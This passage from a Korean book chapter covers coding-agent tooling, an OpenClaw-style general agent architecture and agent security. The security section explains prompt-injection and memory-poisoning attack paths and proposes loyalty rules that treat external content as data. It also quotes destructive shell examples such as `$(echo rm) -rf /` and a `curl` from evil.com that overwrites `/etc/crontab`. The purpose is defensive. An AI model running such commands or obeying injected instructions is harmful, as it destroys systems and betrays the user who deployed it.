# Coding Agent와 코드 생성

앞 장들은 각각 컨텍스트 엔지니어링(제2, 3장)과 도구 설계(제4장)를 깊이 다뤘습니다. 이 장은 이 구성요소들을 하나로 엮어 핵심 질문에 답합니다: **임의의 작업을 처리할 수 있는 범용 Agent의 아키텍처는 어떤 모습일까요?**

답은 이렇습니다: **개방형 작업을 목표로 하는 범용 Agent**의 핵심은 **Coding Agent**(자율적으로 코드를 작성·수정·실행할 수 있는 Agent)와 **파일 시스템**——Agent가 코드, 데이터, 기억, 중간 결과를 저장하는 작업 공간으로, 프로그래머가 컴퓨터에서 폴더로 프로젝트를 관리하는 방식과 유사합니다——의 조합입니다. 이 판단은 산업계 실천에서 검증된 것입니다——Manus부터 OpenClaw까지, 성공적인 개방형 작업형 범용 Agent는 모두 동일한 패러다임을 따릅니다: 소수의 범용 도구(코드 실행, 파일 읽기/쓰기, 검색)로 Coding Agent 런타임을 구축하고, 그 위에 브라우저 자동화, 웹 검색 등의 능력 모듈을 쌓아올립니다. 이 판단의 적용 경계는 "Manus에서 OpenClaw까지" 절 말미에서 별도로 논의합니다.

왜 코드 생성이 이런 중책을 맡을 수 있을까요? 그것이 단지 도구함 속의 도구 하나가 아니라, 실행 시점에 새로운 도구와 능력을 동적으로 만들어내는 **메타 능력**이기 때문입니다. 이 장 후반부("코드: 범용 Agent의 메타 능력" 절)에서 이 개념과 여섯 가지 발휘 방향을 완전히 전개합니다.

코드가 Agent에게 주는 가치는 두 층위로 나타납니다. **사고** 측면에서, 형식화된 코드는 사고를 엄밀하게 만듭니다——"나이가 18세를 초과하고 실명 인증을 마쳤다"를 자연어로 기술하면 여러 해석이 가능하지만, `age > 18 and is_verified`로 쓰면 조금도 모호하지 않습니다. **표현** 측면에서, 실행되는 코드 한 조각 자체가 논리적 자기 일관성의 증명이며, 실행 결과가 객관적인 정오 판단 기준을 제공합니다——이는 자연어가 해낼 수 없는 것입니다.

이 장은 먼저 Coding Agent의 기본 능력과 범용 Agent 아키텍처(OpenClaw)부터 시작해, 이어서 수학적 사고, 콘텐츠 창작부터 시스템 수준의 메타 능력까지 다양한 시나리오에서 코드 생성이 어떻게 응용되는지 보여줍니다.

## Coding Agent

### Coding은 Agent의 기본 능력

**코드 생성은 소수의 전문화된 Agent만의 전유물이 아니라, 모든 범용 Agent가 갖춰야 할 기본 능력입니다.** 현재 SOTA 모델의 뒷받침 아래, 기본적인 coding 능력을 갖추는 데 복잡한 아키텍처가 필요하지 않습니다.

전형적인 작업을 하나 생각해봅시다: "저장소 내 모든 미해결 TODO 주석을 정리해 우선순위별로 분류하고 issue를 생성하라." 이를 완수하려면——디렉터리 구조 탐색(ls/glob), 코드 읽기(read), 파일 수정(edit/write), 명령 실행(bash), 패턴 검색(grep/search)이 필요합니다. 이 다섯 가지 유형의 작업이 거의 모든 Coding Agent의 핵심 동작을 포괄하며, 바로 아래서 전개할 일곱 개 도구의 근거이기도 합니다. 엄밀히 말하면 이 다섯 유형은 자연스럽게 여섯 개 도구에 대응합니다; 일곱 번째인 Code Interpreter는 "코드 실행/계산"이라는 작업 유형에 대응하며, 일부 구현에서는 아예 Bash와 통합되기도 합니다——일곱 개 도구는 정규화된 참조 집합이며 다섯 유형과 엄격하게 일대일로 대응할 필요는 없습니다.

기본적인 Coding Agent는 다음 일곱 개 핵심 도구만 갖추면 됩니다:

1. **Code Interpreter(코드 인터프리터)**: 격리된 샌드박스 환경(sandbox, 즉 메인 시스템과 격리된 안전한 실행 공간으로, 코드가 그 안에서 오류를 일으켜도 호스트 머신에 영향을 주지 않음)을 제공해 Python 코드를 안전하게 실행
2. **Bash Shell(명령줄 터미널)**: 터미널에서 명령을 실행——예를 들어 테스트 케이스를 돌리거나 특수 형식 파일을 처리
3. **파일 읽기 도구**: 코드, 설정, 문서, 로그 등을 읽음
4. **파일 쓰기 도구**: 새 파일을 만들거나 기존 파일을 완전히 재작성
5. **파일 편집 도구**: 기존 파일에 국소적 수정을 가함——코드 유지보수와 반복 작업의 핵심 동작
6. **파일명 검색 도구(Glob)**: 패턴 매칭으로 파일 시스템에서 목표 파일을 빠르게 찾음——예를 들어 `**/*.py`로 프로젝트 내 모든 Python 파일을 찾음
7. **파일 내용 검색 도구(Grep)**: 파일 내용에서 특정 텍스트 패턴을 검색——예를 들어 특정 함수를 호출하는 모든 코드 줄을 검색

이 일곱 개 도구는 완전하면서도 극히 간결한 도구함을 구성하며, 거의 모든 Agent 시스템이 저비용으로 통합할 수 있습니다. 구현상으로는 모두 제4장에서 소개한 MCP 프로토콜을 통해 표준화된 도구 서비스로 노출될 수 있습니다. 주의할 점은, 이 도구 세트는 Coding Agent 특유의 기본 구성이며, 제4장에서 호출 방향과 작용 성질로 나눈 다섯 가지 범용 도구 분류(감지/실행/협업/이벤트 트리거/사용자 소통)와는 다릅니다——일곱 개 핵심 도구는 주로 감지와 실행 두 유형을 다룹니다. 독자는 협업, 이벤트 트리거, 사용자 소통이라는 세 유형의 수요는 어떻게 되는지 궁금할 수 있습니다——Coding Agent에서는 보통 도구 계층이 아닌 Agent 프레임워크가 이를 처리합니다. 예를 들어 하위 Agent 위임은 전용 협업 도구가 아니라 프레임워크의 오케스트레이션 로직이 관리합니다.

가장 단순한 작업으로 이 일곱 개 도구가 어떻게 협업하는지 살펴봅시다. 사용자가 "프로젝트 내 모든 TODO 주석을 정리해서 목록으로 만들어줘"라고 말했다고 가정합시다:

```
Agent（사고）：TODO가 포함된 모든 코드 줄을 찾아야 함.
Agent → Grep("TODO", glob="**/*.py")          # 파일 내용 검색
도구 반환：
  src/api.py:42: # TODO: add rate limiting
  src/db.py:15:  # TODO: migrate to PostgreSQL
  tests/test_api.py:8: # TODO: add edge case tests

Agent（사고）：3개의 TODO를 찾음, 목록으로 정리해 파일에 씀.
Agent → Write("TODO_LIST.md", content="...")   # 파일 쓰기
도구 반환：파일이 생성됨

Agent：정리를 완료했습니다. 총 3개의 TODO 항목을 발견했고, 목록은 TODO_LIST.md에 저장했습니다.
```

전체 과정에서 Grep(내용 검색)과 Write(파일 쓰기) 두 도구만 사용했습니다. 만약 작업이 더 복잡하다면——예를 들어 "각 모듈의 TODO 개수를 통계 내고 막대그래프를 그려줘"——Agent는 Code Interpreter로 Python 코드를 실행해 통계와 시각화를 수행할 것입니다. 일곱 개 도구는 단순하지만 조합하면 매우 다양한 작업을 완수할 수 있습니다.

왜 모든 범용 Agent가 coding 능력을 갖춰야 할까요? 코드 생성은 단순히 프로그램을 작성하는 것이 아니라 범용적인 문제 해결 수단이기 때문입니다. 수학적 추론을 마주하면 코드를 작성해 솔버에게 정확한 답을 맡길 수 있고, 비즈니스 규칙을 고정하려면 코드가 자연어 서술보다 훨씬 정밀하며, 특정 도구가 없으면 즉석에서 하나 작성할 수 있고, 데이터 형식이 바뀌면 파싱 로직을 동적으로 생성할 수 있습니다. 이 장 후반부에서 이런 시나리오들을 차례로 전개합니다. 기본적인 coding 능력을 갖춘 Agent는, 도구함에 위 일곱 개의 단순한 도구만 있어도 새로운 요구를 만났을 때 스스로 능력의 경계를 동적으로 확장할 수 있습니다.

### 사례: Manus에서 OpenClaw까지——범용 Agent의 Coding 커널

Manus로 대표되는 범용 Agent 제품은 Deep Research(심층 조사), Computer Use(컴퓨터 조작), Coding(코드 생성) 세 가지 능력을 하나의 시스템에 융합해, 이미 여러 실천에서 반복 검증된 통찰을 부각시켰습니다: **Coding Agent에 파일 시스템을 더한 것이 개방형 작업형 범용 Agent의 가장 핵심적인 기술 기반입니다.** 오픈소스 프로젝트 OpenClaw도 유사한 사고방식을 채택해, 오픈소스 실천으로 이 아키텍처 패러다임을 보여줍니다.

왜 다른 두 가지가 아니라 Coding Agent가 핵심일까요? 거의 모든 효율적인 콘텐츠 생성이 결국 코드로 귀결되기 때문입니다. PPT는 본질적으로 OOXML(Office Open XML, 마이크로소프트가 내놓은 오피스 문서 개방 표준) 형식의 코드이고, Word 문서와 PDF 보고서는 코드로 생성할 수 있으며, 데이터 분석과 시각화는 Python 스크립트로 완성됩니다. 심지어 GUI 조작 중 성공한 브라우저 조작 시퀀스도 재사용 가능한 RPA(로봇 프로세스 자동화, Robotic Process Automation) 코드로 고정될 수 있습니다(Computer Use 자체는 제9장에서, 조작 시퀀스의 고정 메커니즘은 제8장에서 자세히 다룹니다). Deep Research의 검색과 정보 종합도 코드가 구동하는 웹 요청과 파싱으로 구현할 수 있으며, Computer Use는 범용성이 더 강하지만 비용, 지연, 안정성 면에서 코드나 API로 직접 같은 작업을 수행하는 것에 훨씬 못 미칩니다. 코드 생성은 효율이 가장 높고 비용이 가장 낮으며 재사용성이 가장 강한 능력 기반입니다.


![그림5-1 OpenClaw 아키텍처 속 Coding Agent 핵심](images/fig5-1.svg)


구체적인 실행 흐름으로 이 아키텍처를 이해해봅시다. 사용자가 "지난 분기 매출 데이터를 분석해서 요약 보고서를 만들어줘(Help me analyze last quarter's sales data and create a summary report)"라고 요청했다고 가정합시다:

1. **기억 읽기**: Agent가 `MEMORY.md`를 읽고, 사용자가 PDF 형식 보고서를 선호하며 데이터 소스가 Google Sheets임을 발견
2. **도구 호출**: 웹 검색 모듈로 Google Sheets API 사용법을 확인하고, 코드 실행으로 데이터를 다운로드
3. **코드 작성**: Python으로 데이터 분석 스크립트를 생성(pandas 집계, matplotlib 시각화)
4. **산출물 생성**: 분석 결과를 `report.pdf`에 기록하고, 차트를 `charts/` 디렉터리에 기록
5. **기억 갱신**: `MEMORY.md`에 "User's sales data is in Google Sheets, ID: xxx"를 기록——다음번에는 다시 묻지 않아도 됨

전체 과정에서 파일 시스템은 정보 흐름의 허브입니다——기억은 파일에서 읽히고, 산출물은 파일에 기록되며, 경험도 파일로 저장됩니다.

**파일 시스템은 Agent의 중추.** OpenClaw의 설계에서 파일 시스템은 단순한 데이터 저장소를 훨씬 넘어섭니다——그것은 Agent의 기억, 지식, 능력의 중추입니다. Agent의 장기 기억은 `MEMORY.md`(상위 수준 사실과 사용자 선호)와 날짜별로 정리된 Markdown 로그에 저장됩니다. 벡터 데이터베이스가 아닌 Markdown을 선택한 이 결정은 반직관적으로 보이지만 실제로는 매우 효과적입니다: 사용자가 직접 파일을 열어 Agent의 기억을 읽고 수정할 수 있고(Agent가 어떤 일을 잘못 기억하고 있다면 그 줄을 지우면 그만입니다), Markdown은 시간 순서를 자연스럽게 보존해 의미 검색에서 발생하는 시간 혼동을 방지하며, Git으로 버전 관리와 롤백도 가능합니다.

더 중요한 것은, Agent가 파일을 쓸 수 있는 능력을 가지고 있다는 점입니다. 이는 파일 쓰기를 통해 **스스로 진화**할 수 있음을 의미합니다. Agent가 어떤 작업을 처음 수행하면서 이전에 몰랐던 핵심 정보를 발견하면(예를 들어 어느 은행에 전화를 걸 때, 상대방이 신원 확인을 위해 개설 지점 주소를 요구한다는 것을 발견), 이 경험을 지식 베이스에 기록해 다음번 같은 작업을 수행할 때 자동으로 불러옵니다. 이 "쓸수록 똑똑해지는" 메커니즘은 본질적으로 제8장에서 깊이 논의할 외부화 학습 패러다임의 구체적 실천입니다.

**적용 경계: 어떤 Agent가 Coding을 핵심 아키텍처로 삼는가.** "Coding Agent가 범용 Agent의 핵심"이라는 판단은 주로 **개방형 작업을 목표로 하는** 범용 Agent——심층 조사, 콘텐츠 생성, 데이터 처리처럼 작업 경계가 불확정적이고 산출물 형태가 다양한 시나리오——에 적용됩니다. 이런 시나리오에서는 필요한 모든 도구를 사전에 나열할 수 없으므로, 코드 생성이 메타 능력으로서 능력 경계를 동적으로 확장하는 가장 경제적인 경로를 제공하며, 따라서 아키텍처의 핵심이 됩니다. 반면 다른 유형의 Agent——수직 도메인의 고객 서비스 Agent, 음성 비서——는 작업 공간이 상대적으로 폐쇄적이며, 핵심 아키텍처는 고정된 비즈니스 프로세스, 도메인 도구, 대화 전략을 중심으로 구축됩니다. 이런 경우 코드는 아키텍처의 중추라기보다는 도구함 속 하나의 도구에 가깝습니다(이 장 후반부의 τ-bench(고객 서비스 시나리오를 모사한 벤치마크 테스트, 자세한 내용은 후술) 예시에서 코드는 정책 검증 도구의 역할을 합니다). 하지만 후자에서도 coding은 없어서는 안 될 기본 능력입니다: 정밀 계산, 데이터 처리, 규칙 검증은 모두 이를 필요로 합니다——이는 앞 절 "Coding은 Agent의 기본 능력"이라는 명제와 정확히 호응합니다: Coding을 핵심 아키텍처로 삼을지는 시나리오마다 다르지만, coding 능력을 갖추는 것은 모든 Agent의 공통 최저선입니다.

### Sessionless 설계

다음으로 "언제든 사용 가능한" 상호작용 방식과 보안 아키텍처라는 두 설계를 논의하겠습니다. 언뜻 Coding Agent 주제와 무관해 보이지만, 이들은 Agent가 코드 실행 환경과 파일 시스템 상태를 어떻게 관리하는지를 직접 결정하며, 이는 바로 Coding Agent의 핵심 관심사입니다.(Coding Agent가 단계별로 어떻게 작동하는지 먼저 알고 싶은 독자는 뒤의 "Coding Agent의 전체 흐름" 절을 먼저 읽고 여기로 돌아와도 됩니다.)

OpenClaw는 **Sessionless**(무세션) 설계를 채택합니다: 설치, 로그인, "앱 열기" 같은 단계가 없고, Agent는 상시 온라인 상태로 존재해, 사용자는 이미 사용 중인 메시징 플랫폼에서 언제든 메시지 하나만 보내면 응답을 받을 수 있습니다——이 상호작용 형태와 그 배후의 Gateway 메시지 라우팅 및 이벤트 기반 아키텍처는 이미 제4장 사용자 소통 도구 부분에서 자세히 논의했으므로 여기서는 다시 다루지 않습니다. 강조할 만한 것은 이런 형태가 성립하는 전제입니다: 대형 모델이 이미 새로운 "지능 기반"으로서 충분히 성숙했다는 것——전통적인 운영체제가 하드웨어를 가려 상위 애플리케이션에 통일된 추상을 제공하는 것처럼, 대형 모델은 언어 이해와 사고·계획의 복잡성을 가려 상위 Agent에게 통일된 지능 추상을 제공합니다. 이 기반이 있기에 "상시 존재 + 즉시 응답" 형태를 낮은 비용으로 엔지니어링할 수 있습니다.

Coding Agent에게 Sessionless의 진짜 공학적 난점은 **코드 실행 환경과 파일 시스템 상태가 메시지를 넘나들며 어떻게 살아남는가**에 있습니다. 사용자의 두 메시지 사이 간격은 몇 분일 수도, 며칠일 수도 있으며, Agent의 작업은 대량의 암묵적 상태에 의존합니다: 샌드박스에 설치된 의존성 패키지, 터미널 세션의 작업 디렉터리와 환경 변수, 백그라운드에서 돌아가는 개발 서버, 절반쯤 쓴 파일. OpenClaw의 방식은 상태를 두 층으로 나눠 관리하는 것입니다. **파일 시스템 상태는 본래 지속적**입니다——작업 공간(workspace) 디렉터리가 샌드박스 밖의 영구 저장소에 마운트되어 있어, 코드, 데이터, 중간 산출물은 메시지와 샌드박스 재시작을 넘나들어도 사라지지 않습니다. 이는 "파일 시스템이 Agent 중추"라는 또 다른 함의이기도 합니다. **프로세스 상태는 필요에 따라 유지되거나 재구축**됩니다——샌드박스와 그 안의 터미널 세션은 활동 기간 동안 계속 실행되어, 매 메시지마다 콜드 스타트로 디렉터리를 다시 전환하고 가상 환경을 다시 활성화하는 것을 피합니다. 유휴 시간 초과 후에는 자원 회수를 위해 파괴되며, 파괴 전에 직렬화 가능한 환경 상태(작업 디렉터리, 환경 변수, 백그라운드 작업 목록)를 작업 공간 파일에 기록해두고, 다음번 깨어날 때 Agent가 그 기록에 따라 재구축합니다. 이 장 후반부 "명령 실행 환경의 상태 지속화"에서 논의할 지속적 터미널 세션은 바로 이 메커니즘의 단일 작업 내 대응물입니다; Sessionless는 같은 문제를 메시지와 날짜를 넘나드는 시간 스케일로 늘린 것입니다.

Sessionless는 유지보수가 필요 없는 것도 아닙니다——사용자 메시지마다 **완전한 궤적과 작업 상태를 다시 로드**해야 함을 의미하므로, 상태 직렬화 효율과 궤적 압축 전략에 더 높은 요구가 따릅니다. 궤적 압축 자체의 설계 원칙은 제2장 "컨텍스트 압축 전략"에서 이미 논의했으며, 이 장에서는 Sessionless 아키텍처 하의 공학적 트레이드오프에 초점을 맞춥니다.

### Coding Agent의 보안

이 절은 Coding Agent의 보안 방어선을 하나의 완전한 서사로 모읍니다: 먼저 **위협 모델**——어떤 위험이 가장 치명적인지——을 그리고; 이어서 **격리 안전망**——샌드박스의 네트워크 출구, 파일 시스템, 자원 한도——을 논하고; 그다음 **실행기 방어**——명령의 의미 분석, 그리고 보안 검사를 "보이지 않게" 하는 추측 실행——를; 마지막으로 **신뢰와 충성**——다자 위임 하에서 Agent는 누구 편인가, 그리고 AI가 작성한 코드 자체가 신뢰할 수 없을 때 신뢰 경계를 데이터 층으로 어떻게 내려보내는가——로 귀결됩니다. 이 중 위협 모델, 충성도, 신뢰 경계에 대한 논의는 모든 Agent에 공통되며, 샌드박스와 명령 파싱은 Coding Agent 특유의 증분입니다.

이런 "주권 지능체" 패러다임은 심각한 보안 도전도 함께 가져옵니다. Coding Agent는 파일을 읽고 쓰고, 명령을 실행하고, 네트워크에 접근하는 권한을 가지고 있어, 일단 악성 명령이 주입되면 돌이킬 수 없는 손실을 초래할 수 있습니다. 개발자이자 독립 연구자인 Simon Willison은 이런 위험을 유명한 "치명적 세 가지 요소"로 요약했습니다——세 요소가 모두 갖춰지면 완전한 공격 폐회로가 형성되고, 시스템은 곧바로 고위험군에 속하게 됩니다:

1. **개인 데이터 접근**——Agent가 사용자 파일과 비밀번호 관리자를 읽을 수 있음
2. **신뢰할 수 없는 콘텐츠에 노출**——처리하는 이메일과 웹페이지에 악성 페이로드가 담길 수 있음
3. **외부 통신 능력 보유**——이메일을 보내고 명령을 실행할 수 있음

공격 경로는 이렇게 닫힙니다: 신뢰할 수 없는 콘텐츠에 숨은 악성 명령이 Agent에 들어가, 개인 데이터를 읽게 만들고, 외부 통로를 통해 유출됩니다. 세 요소만 갖춰져도 이미 충분히 위험하며, 추가 조건이 필요 없다는 점에 유의해야 합니다. 이를 토대로 필자는 네 번째 차원——**지속적 기억**——을 보충합니다. 이는 병렬적인 네 번째 필요조건이 아니라 공격의 증폭기입니다: 공격자는 겉으로 무해해 보이는 편향이나 악성 명령을 Agent의 장기 기억에 심어 세션을 넘나들며 잠복시키다가, 적절한 시점에 다시 촉발해 일회성 공격을 장기적인 잠복과 증폭으로 격상시킬 수 있습니다.

이 네 가지는 네 가지 유형의 경계로 요약할 수 있습니다: 데이터 경계, 입력 신뢰 경계, 출력 영향 경계, 세션 간 경계. OpenClaw 같은 전권한 로컬 Agent는 정확히 이 네 가지를 모두 갖추고 있으므로, 보안 방어는 이런 유형의 Agent가 반드시 직시해야 할 핵심 도전이 됩니다.

이는 또한 왜 폐쇄형 상용 Agent(예: Claude Cowork(Anthropic이 지식 노동을 위해 내놓은 범용 Agent로, Claude Code의 agentic 아키텍처를 재사용해 로컬 파일을 읽고 쓰며 여러 오피스 애플리케이션을 넘나들며 다단계 작업을 완수할 수 있음))가 보수적인 권한 정책을 선택했는지 설명해줍니다——기술이 안 돼서가 아니라 보안 위험이 너무 크기 때문입니다. 프롬프트 주입 위협 앞에서 입력 필터링만으로는 거의 막을 수 없습니다. 핵심은 모든 공격을 식별하는 것이 아니라, Agent가 주입당하더라도 위험한 동작을 실제로 실행할 기회가 없게 만드는 것입니다. 방어 체계는 앞 두 장에서 이미 계층적으로 구축되었습니다: **컨텍스트 층 방어**——외부 콘텐츠 출처 표시, 구조화된 역할 격리, 입력 세정——은 제2장 프롬프트 주입 절 참조; **실행 층 방어**——Sidecar 독립 검토, Human in the loop(사람이 루프에 개입), 최소 권한과 권한 분리——는 제4장 참조. 같은 컨텍스트 안의 Agent는 자신이 이미 주입당했는지 판단하기 어려우므로, 핵심 동작은 반드시 컨텍스트 바깥의 메커니즘으로 재검토해야 한다는 원칙이 두 장을 관통합니다. 이 절은 Coding Agent 특유의 세 가지 증분만 보충합니다:

- **명령 의미 파싱**——Shell 명령의 조합 폭발로 키워드 블랙리스트는 무력화되므로, 반드시 의미 층에서 명령의 실제 효과를 이해해야 합니다(이 절 후반부에서 전개);
- **샌드박스 격리와 네트워크 출구 통제**——코드 실행은 Coding Agent 고유의 공격면이며, 격리 수준과 출구 정책의 공학적 선택은 이 절 후반부 참조;
- **지속적 기억의 세션 간 방어선**——이는 이 장이 치명적 세 요소 외에 특별히 강조하는 확장 항목입니다: 장기 기억에 쓰이는 내용은 외부 콘텐츠와 동등한 신뢰 심사를 거쳐야 하며, `MEMORY.md`에 악성 명령이 잠복해 장기적으로 유효해지는 것을 막아야 합니다.

이 세 증분은 각각 검증, 실행, 데이터 세 층위에 놓이며 앞 두 장의 방어 체계를 보완합니다. 이 전략들이 위험을 완전히 제거할 수는 없지만 Agent의 공격면을 줄일 수 있습니다.

**격리 안전망: 코드 실행 샌드박스의 공학적 선택.** 샌드박스는 단순한 스위치가 아니라 일련의 공학적 결정입니다. 제4장은 이미 "왜 격리해야 하는가", 격리 메커니즘의 등급 원리(프로세스 수준 격리, 컨테이너, microVM 세 단계 스펙트럼), 그리고 "개인 로컬은 프로세스 수준, 단일 테넌트 클라우드는 컨테이너, 다중 테넌트나 낯선 코드는 microVM/gVisor"라는 선택 원칙에 답했습니다. 여기서는 이 스펙트럼을 반복하지 않고, Coding Agent가 실제 적용될 때 피할 수 없지만 제4장에서 다루지 않은 네 가지 증분——네트워크 출구를 어떻게 관리할지, 파일 시스템을 얼마나 마운트할지, 자원을 어떻게 제한할지, 지속적 세션과 격리를 어떻게 조화시킬지——만 보충합니다.

**네트워크 출구 통제.** 가장 간과되기 쉬우면서도 가장 핵심적인 항목입니다: 기본적으로 네트워크를 차단하고, 필요에 따라 화이트리스트 프록시로 제한된 목적지(패키지 관리 소스, 문서 사이트, 작업에 명확히 필요한 API)만 허용합니다. 치명적 세 요소의 세 번째——"외부 통신 능력 보유"——를 되돌아보면, 네트워크 출구 통제가 바로 그것의 실행 면 방어입니다: 프롬프트 주입이 성공해 샌드박스 안에서 악성 코드가 민감한 데이터를 읽었더라도, 출구가 없으면 유출되지 못합니다. 매번의 주입을 식별하려 애쓰는 것보다 데이터 유출 통로를 끊는 편이 훨씬 확정적인 방어선입니다.

**파일 시스템 격리 범위.** 소스 코드 디렉터리는 읽기 전용으로 마운트합니다(Agent는 편집 도구로 코드를 수정하고, 생성된 패치는 검토를 거친 뒤 반영되거나, 사본을 쓰기 가능한 작업 공간에 마운트합니다); 별도의 쓰기 가능한 작업 공간 디렉터리가 산출물과 중간 파일을 담당합니다; 자격 증명류 파일(`~/.ssh`, 키, 토큰)은 애초에 샌드박스에 마운트하지 않습니다——보이지 않는 데이터는 유출될 수 없으며, 이는 치명적 세 요소의 첫 번째 항목에 대응합니다.

**자원 한도와 타임아웃.** CPU, 메모리, 디스크 할당량에 벽시계 타임아웃을 더해, 무한 루프, fork 폭탄(자기 복제 프로세스가 미친 듯이 늘어나 시스템을 다운시킴), 무한 쓰기를 방어합니다. 실무 세부사항 하나: 타임아웃과 초과는 프로세스를 조용히 죽이지 말고 구조화된 오류(예: "실행이 120초를 초과해 종료되었습니다. 마지막 출력은 다음과 같습니다……")를 Agent에 반환해, Agent가 다음 라운드에서 전략을 수정할 기회를 줘야 합니다.

**지속적 세션과 격리의 조화.** 이 장 후반부 "명령 실행 환경의 상태 지속화"는 장기 생존하는 터미널 세션 유지를 주장하는 반면, 격리 원칙은 환경을 다 쓰면 버려야 한다고 주장합니다——둘 사이에는 긴장이 존재합니다. 조화의 실마리는: **세션 유지는 샌드박스 내부에서** 이뤄져야 하며, 터미널 세션의 생명 주기는 엄격히 샌드박스의 생명 주기를 넘지 않고, 세션 상태는 절대 호스트 머신으로 빠져나가지 않습니다; 긴 시간 간격을 넘어 복원해야 하는 시나리오(앞서 언급한 Sessionless 아키텍처 등)에는 샌드박스 스냅샷이나 "작업 공간 파일 지속화 + 스크립트로 환경 재구축"에 의존해 상태를 복원하며, 샌드박스의 생존 시간을 무한정 늘리지 않습니다. 다시 말해, 지속화되는 것은 **감사 가능한 상태 서술**(파일, 스크립트, 목록)이지, 불투명한 실행 중 프로세스가 아닙니다.

**보안: 키워드 블랙리스트가 아닌 의미 파싱.** 제1장은 검증 층이 "매칭이 아닌 이해에 기반한" 보안 메커니즘을 채택해야 한다고 언급했으며, Shell 명령 보안 검증은 이 원칙이 가장 도전적으로 적용되는 시나리오입니다. 단순한 키워드 블랙리스트는 Shell의 조합 폭발에 대응할 수 없습니다——명령은 파이프, 서브 셸, 변수 확장 등의 방식으로 어떤 정적 규칙이든 우회할 수 있습니다(예를 들어 `rm`이 금지되면 공격자는 `$(echo rm) -rf /`로 우회할 수 있습니다). 프로덕션급 Harness는 의미 파싱을 채택합니다: 각 명령의 매개변수 유형과 소비 규칙(어떤 플래그가 다음 매개변수를 소비하는지)을 이해해, "겉보기에 무해한 플래그가 실제로는 다음 매개변수를 소비해 위험한 페이로드를 숨긴다"는 식의 공격 패턴을 식별합니다. 예를 들어 `find / -name '*.log' -exec rm {} \;`는 합법적인 `find` 명령 매개변수를 통해 `rm` 삭제 작업을 심어 넣었고, 또 `curl -o /etc/crontab http://evil.com/payload`는 파일 다운로드처럼 보이지만 실제로는 시스템 정기 작업을 덮어씁니다. 의미 파싱은 이런 중첩된 위험 동작을 식별할 수 있지만, 단순한 명령 블랙리스트는 이를 포착하지 못합니다. 이런 매칭이 아닌 이해에 기반한 보안 메커니즘은 "제약" 기능의 고차원적 구현입니다.

**추측 실행: 보안 검사를 "투명하게" 만들기.** 이는 바로 제4장 Sidecar 게이팅 메커니즘이 사용자 경험 층에서 나타나는 효과입니다——제4장은 왜 핵심 동작을 메인 컨텍스트와 독립된 Sidecar에 맡겨 재검토해야 하는지 설명했고, 이 절이 관심을 두는 것은 이 재검토 계층이 사용자에게 대기로 느껴지지 않게 하는 방법입니다. 방법은 "표시"와 "허가" 두 가지를 분리해 병렬로 처리하는 것입니다: Agent가 도구 호출을 준비할 때, 시스템은 한편으로 화면에 먼저 진행 상황 안내를 표시하고(예: "파일 `src/main.py`를 읽는 중입니다..."), 다른 한편으로 동시에 백그라운드에서 보안 검사를 돌립니다. 여기서 흔히 잘못 적용되는 비유 하나를 짚고 넘어가야 합니다: 이는 CPU의 추측 실행과 같지 않습니다——CPU는 잘못 추측하면 이미 계산한 결과를 버리고 상태를 롤백해야 하지만, 여기서 먼저 나가는 것은 **부작용 없는 UI 안내**일 뿐이며, 어떤 실제 상태도 변경하지 않으므로 검사가 통과하지 못해도 롤백할 필요가 없이 안내를 "확인 대기"로 바꾸면 됩니다. 대부분의 경우 보안 검사는 사용자가 알아차리기 전에 이미 완료되어 사용자는 추가 지연을 전혀 느끼지 못하며, 빠르게 판정할 수 없을 때만 진짜로 멈춰서 확인을 기다립니다. 이것이 Harness 설계의 최고 경지입니다: 보안성이 사용자 경험을 희생시키지 않습니다.

**Agent는 누구에게 충성하는가: 다자 위임 하의 충성도.**

앞의 보안 메커니즘은 "명령이 나쁜 짓을 하는" 것을 막지만, 더 미묘한 보안 문제가 하나 더 있습니다——**위임자 충성도**(principal loyalty): **Agent는 도대체 누구 편인가.** 모델은 훈련 시 "누가 나에게 말을 걸든 최선을 다해 그를 돕는다"는 소박한 기본 원칙을 주입받습니다. 그러나 실제 Agent는 종종 **다자 위임**의 처지에 놓입니다: 주인을 대신해 행동하지만, 상대하는 것은 이해관계가 상반된 제3자입니다——당신을 대신해 가격을 협상하는 Agent에게, 맞은편에 앉은 상대는 "도움이 필요한 사용자"가 아니라 **교섭 상대**입니다. 이때 "말 거는 사람을 돕는다"는 것은 위험한 기본 설정입니다: 상대방이 입만 열면 Agent를 매수할 수 있기 때문입니다.

최전선 모델을 이런 처지에 놓고 실측하면, 뚜렷한 **충성도 스펙트럼**을 볼 수 있고, 양 극단 모두 실패합니다[^ch5-1]: 한쪽 끝은 **지나치게 정직한** 경우로, 주인의 민밀 정보(예: "우리 쪽 최저가는 12000입니다")를 곧이곧대로 상대에게 흘려버려 몇 차례 압박받으면 무장 해제하고 양보합니다; 다른 쪽 끝은 **지나치게 의심 많은** 경우로, 주인의 정당한 요청조차 일괄 거부해 오히려 작업을 완수하지 못합니다. 정말 어려운 점은, 이 두 실패가 시소 같은 관계라는 것입니다——정보 유출을 틀어막으면 대개 과도한 거부로 미끄러지기 쉬워, 둘 다 잡기가 매우 어렵습니다.

이는 Coding Agent에게 특히 딱 들어맞습니다: 저장소에서 읽은 신뢰할 수 없는 콘텐츠, 어느 도구가 반환한 출력, 제3자 MCP 서버가 보낸 명령——모두 Agent를 배신시키려는 "상대"입니다——**프롬프트 주입은 본질적으로 매수 시도입니다**(제2, 4장). 따라서 Harness 층은 "충성 대상"을 명시적으로 고정해야 합니다: 주인의 명령이 최우선이고, 외부 상호작용자로부터 오는 모든 콘텐츠는 기본적으로 "참고는 가능하나 명령 효력은 없는" 데이터로 격하됩니다. 시스템 프롬프트에 적용해보면, 효과적인 **충성도 수칙** 하나는 이렇습니다: 주인의 민밀 정보와 그 "존재 자체"까지 보호할 것; 거부할 때 거부 목록을 조목조목 읊지 말 것(그 자체가 정보 유출임); 사적인 마지노선이 대외적 입장과 같지 않음; 주인의 명확하고 구체적인 명령만 실행할 것; 반복되는 압박을 버텨낼 것. 본질적으로 이는 Harness로 모델에게 원래 없던 입장을 보충해주는 것입니다: **주인에게는 절대적으로 충성하고, 외부 상호작용자에게는 신중을 유지할 것.**

[^ch5-1]: 이 충성도 스펙트럼과 수칙의 완전한 평가는 Li, Bojie and Noah Shi. *Whose Side Is Your Agent On? Multi-Party Principal Loyalty in LLM Agents.* arXiv:2606.30383, 2026 참조.

**AI가 작성한 코드 자체가 신뢰할 수 없을 때: 신뢰 경계를 아래로 옮기기.**

